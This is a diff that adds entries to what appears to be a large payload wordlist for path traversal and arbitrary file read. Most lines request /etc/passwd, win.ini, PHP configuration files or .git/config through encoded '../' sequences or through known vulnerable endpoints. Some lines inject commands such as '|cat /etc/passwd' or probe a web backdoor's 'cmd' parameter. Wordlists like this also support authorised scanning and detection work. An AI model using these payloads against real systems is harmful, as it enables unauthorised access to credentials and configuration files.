@@ -12486,6 +12486,7 @@ $(`cat /etc/passwd`)
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 /+cscot+/translation-table?type=mst&textdomain=/%2bcscoe%2b/portal_inc.lua&default-language&lang=../
+/+cscou+/../+cscoe+/files/file_list.json?path=/
 /+cscou+/../+cscoe+/files/file_list.json?path=/sessions
 /..%c0%9v../
 /..%c0%af../
@@ -12726,14 +12727,19 @@ $(`cat /etc/passwd`)
 /..//{file}
 /../;/
 /../;/../
+/../_config.php
 /../boot.ini
 /../conf/config.properties
 /../conf/tomcat-users.xml
 /../config.asp
+/../config.inc.php
 /../config.jsf
+/../config.php
 /../etc/passwd
 /../g
+/../install.php
 /../package.json
+/../users.db.php
 /../{file}
 /../{hostname_or_folder}.ini
 /..;/../
@@ -12930,10 +12936,12 @@ $(`cat /etc/passwd`)
 /app/code/magento/tax/etc/crontab.xml
 /assets../.git/config
 /assets/../package.json
+/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
 /avalancheweb/image?imagefilepath=c:/windows/win.ini
 /base/static/c:/windows/win.ini
 /base_import/static/c:/windows/win.ini
 /base_import/static/etc/passwd
+/basilix.php3?request_id[dummy]=../../../../etc/passwd&requestid=dummy&username=sec&password=secu
 /blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
 /brightmail/servlet/com.ve.kavachart.servlet.chartstream?sn=../../web
 /brightmail/servlet/com.ve.kavachart.servlet.chartstream?sn=../../web-inf/
@@ -12942,6 +12950,7 @@ $(`cat /etc/passwd`)
 /c6/jhsoft.web.customquery/uploadfiledownloadnew.aspx/?filepath=../resource/jhfileconfig.ini
 /c:/windows/system32/drivers/etc/hosts?raw
 /ccmivr/ivrgetaudiofile.do?file=../../../../../../../../../../../../../../../etc/passwd
+/cd/../config/html/cnf_gi.htm
 /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
 /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
 /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
@@ -12953,9 +12962,13 @@ $(`cat /etc/passwd`)
 /cgi-bin/;cat$ifs/etc/passwd
 /cgi-bin/check.cgi?file=../../../etc/passwd
 /cgi-bin/chklogin.cgi?file=../../../etc/passwd
+/cgi-bin/db4web_c/dbdirname/etc/hosts
 /cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
 /cgi-bin/maconomy/maconomyws.macx1.w_mcs//etc/passwd
+/cgi-bin/opendir.php?/etc/passwd
 /cgi-bin/operator/fileread?read.filepath=/etc/passwd
+/cgi-bin/scripts/../../this_server/servermanager.srv
+/cgi-bin/shop.cgi/page=../../../filename.ext
 /cgi-bin/webcm?getpage=../html/login.html
 /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=bas_bpa
 /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard
@@ -12970,6 +12983,7 @@ $(`cat /etc/passwd`)
 /collection//etc/passwd
 /collection//etc/passwd/getimages
 /collection//etc/passwd/getobjects
+/conf&log=/etc/passwd&noih=no&frames=y
 /content../.git/config
 /criminalcase//etc/passwd
 /criminalcase/delete//etc/passwd
@@ -12978,6 +12992,7 @@ $(`cat /etc/passwd`)
 /css../.git/config
 /defaultroot/download_ftp.jsp?path=/../web-inf/&name=aaa&filename=web.xml
 /deleteobject//etc/passwd
+/demantra/common/logincheck.jsp/../../graphservlet
 /downfile.php?filename=../../../../etc/passwd
 /download.do?file=../../../../config.text
 /download.php?file=/etc/passwd
@@ -13141,6 +13156,7 @@ $(`cat /etc/passwd`)
 /etc/shadow~
 /events../.git/config
 /examples/../manager/html/
+/ezhttpbench.php?analysesite=/etc/passwd&numloops=1
 /file:///etc/passwd
 /gepi/gestion/savebackup.php?filename=xxpathxx&cmd=cat/etc/passwd
 /getcollection//etc/passwd
@@ -13308,6 +13324,8 @@ $(`cat /etc/passwd`)
 /nul/../../../../../../../../../winnt/system32/ipconfig.exe
 /olds/home/000~root~000/etc/passwd
 /oliver/fileservlet?source=serverfile&filename=c:/windows/win.ini
+/opendir.php?/etc/passwd
+/opendir.php?requesturl=/etc/passwd
 /opt/bitnami/var/log/
 /opt/bitnami/var/log/audit/
 /opt/bitnami/var/log/bootstrap-actions/
@@ -13318,6 +13336,7 @@ $(`cat /etc/passwd`)
 /opt/bitnami/var/log/post-start.log
 /oscommerce_installation/default.php/cpath/../../
 /photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php.
+/phptonuke.php?filnavn=/etc/passwd
 /pictureproxy.php?url=file:///etc/passwd
 /plugins/servlet/snjcustomdesignconfig?filename=../dbconfig.xmlpasswd&filemime=$textmime
 /plus/carbuyaction.php?dopost=return&code=../../
@@ -13529,9 +13548,12 @@ $(`cat /etc/passwd`)
 /seeyon/webmail.do?method=dodownloadatt&filename=index.jsp&filepath=../conf/datasourcectp.properties
 /servlet/com.livesoftware.jrun.plugins.ssi.ssifilter/../../../../../../../boot.ini
 /servlet/com.livesoftware.jrun.plugins.ssi.ssifilter/../../../../../../../etc/passwd
+/servlet/ssifilter/../../filename
 /servlets/fetchfile?filename=../../../etc/passwd
 /servlets/fileuploadservlet?filename=../jsp/login.jsp
 /showfile.php?file=/etc/passwd
+/simple-backdoor.php?cmd=cat+/etc/passwd
+/someapp/javax.faces.resource.../web-inf/web.xml.jsf
 /src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd
 /src/read_body.php?mailbox=/etc/passwd&passed_id=1&
 /static../.git/config
@@ -13550,6 +13572,7 @@ $(`cat /etc/passwd`)
 /test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd
 /test/streamer/mg.nmq?../campaign
 /test_duportal/home/../home/channel.asp
+/tmp_view.php?file=/etc/passwd
 /tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/etc/passwd
 /tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/etc/passwd'
 /torrential/dox/getdox.php/../../index.html
@@ -14099,7 +14122,9 @@ $(`cat /etc/passwd`)
 /var/spool/postfix/etc/hosts
 /view/ipv6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7ccat+/etc/passwd;
 /view/systemconfig/systemtool/traceroute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7ccat+/etc/passwd;
+/viewpage.php?file=/etc/passwd
 /vpn/../vpns/cfg/smb.conf
+/vpn/../vpns/portal/scripts/newbm.pl
 /wavemaker/studioservice.download?method=getcontent&inurl=file///etc/passwd
 /wealtht24/getimage?docdownloadpath=/etc/passwd
 /wealtht24/getimage?docdownloadpath=c:/windows/win.ini
@@ -14401,6 +14426,7 @@ $(`cat /etc/passwd`)
 /x//../
 /x/;/../
 /x/<img/onerror='alert(injectx)'src=x>/../../
+/xyz/../../thinvnc.ini
 0admin...................../
 0x2e0x2e//etc/passwd
 0x2e0x2e/0x2e0x2e//etc/passwd
